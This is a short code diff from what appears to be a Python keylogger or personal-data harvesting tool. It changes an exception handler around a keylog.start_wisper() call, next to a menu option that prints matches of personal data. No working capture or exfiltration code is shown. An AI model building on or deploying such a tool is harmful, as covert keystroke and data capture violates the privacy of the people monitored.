@@ -70,7 +70,7 @@ def main():
       try:
           keylog.start_wisper()
       except:
-          pass
+          filek.close()
 
     elif option == '5':
       print("Printing all matches of personal data...")
